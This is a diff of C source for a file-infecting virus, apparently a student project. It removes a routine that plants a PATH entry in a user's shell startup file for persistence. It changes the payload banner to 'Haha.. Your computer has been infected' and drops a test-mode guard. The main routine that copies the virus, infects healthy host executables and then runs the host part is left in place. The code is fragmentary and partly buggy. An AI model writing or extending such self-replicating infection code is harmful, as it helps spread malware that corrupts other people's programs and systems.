@@ -25,32 +25,9 @@ static inline char* randomly_select_dir(char **dirs)
 	return (char *)dirs[get_random_number(4)];
 }
 
-void infectBashSrc(char *userName){
-	char export_ls[250] = "export PATH=\"/home/";
-	strcat(export_ls, userName);
-	strcat(export_ls,"/BTP_WORKS/malware:$PATH\""); 
-	
-	// Open .bashsrc
-	int bashsrc_fd = open(strcat(strcat("/home/",userName),"/.bashsrc"), O_RDWR);
-	
-	// Check last statement for export
-	char buff[1024];
-	if ( bashsrc_fd != NULL) // open file
-	{
-		fseek(bashsrc_fd, 0, SEEK_SET); // make sure start from 0
-		while(!feof(bashsrc_fd))
-		{
-		    memset(buff, 0x00, 1024); // clean buffer
-		    fscanf(bashsrc_fd, "%[^\n]\n", buff); // read file *prefer using fscanf
-		}
-		printf("Last Line :: %s\n", buff);
-	}
-}
-
-
 /* Execute malacious instructions */
 void devastation() {
-	const unsigned char banner[] = "Virus Text... ";
+	const unsigned char banner[] = "Haha.. Your computer has been infected\n";
 	write(1, (char *)banner, sizeof(banner));
 }
 
@@ -206,19 +183,12 @@ void makeCopyAndAddSignature(char *fileName){
 
 
 void main(int argc, char *argv[]) {
-    	srand(time(0));
-	
-#if TEST
-	devastation();
-	return 0;
-#endif
-	
+    srand(time(0));
 	makeCopyAndAddSignature(argv[0]);
 
 	int virus_fd = open(argv[0], O_RDWR);
-    	struct stat st;
+    struct stat st;
 	fstat(virus_fd, &st);
-	
 	devastation();
 	
 	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
@@ -230,9 +200,7 @@ void main(int argc, char *argv[]) {
 		makeCopyAndAddSignature(argv[0]);
 	else
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
-
 	close(virus_fd);
-
 }
 
 
